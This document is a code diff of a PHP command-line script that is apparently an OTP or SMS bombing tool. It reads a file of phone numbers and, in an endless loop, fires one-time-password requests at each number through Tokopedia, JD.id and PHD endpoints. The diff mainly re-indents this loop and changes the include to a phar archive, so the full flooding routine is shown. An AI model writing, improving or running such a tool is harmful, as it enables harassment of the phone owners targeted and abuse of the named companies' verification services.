@@ -1,6 +1,5 @@
-#!/usr/bin/env php
 <?php
-require "lite.class.php";
+require_once 'phar://main.phar/class.php';
 if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     $R  = '';
     $RR = '';
@@ -55,24 +54,27 @@ if(is_numeric($argv[1])) {
 		ob_get_clean();
 	}
 }
-	else {
-		if(file_exists($argv[1])) {
-			$argv[1]=file_get_contents($argv[1]);
-			$argv[1]=str_replace(' ','',$argv[1]);
-			$argv[1]=explode("\n",$argv[1]);
-			$count=sizeof($argv[1]);
 
-			while(1) {
-				for($x=0;$x<$count;$x++) {
-					fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
-					ob_start();
-					echo $bom->otp($argv[1][$x],'tokopedia');
-					echo $bom->otp($argv[1][$x],'jdid');
-					echo $bom->otp($argv[1][$x],'phd');
-					ob_get_clean();
-				}
+else {
+	if(file_exists($argv[1])) {
+		$argv[1]=file_get_contents($argv[1]);
+		$argv[1]=str_replace(' ','',$argv[1]);
+		$argv[1]=explode("\n",$argv[1]);
+		$count=sizeof($argv[1]);
+
+		while(1) {
+			for($x=0;$x<$count;$x++) {
+				fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
+				ob_start();
+				echo $bom->otp($argv[1][$x],'tokopedia');
+				echo $bom->otp($argv[1][$x],'jdid');
+				echo $bom->otp($argv[1][$x],'phd');
+				ob_get_clean();
 			}
 		}
+	}
+	else {
 		fprintf(STDERR,$RR.'File not exist'.$X);
 		exit(-1);
 	}
+}
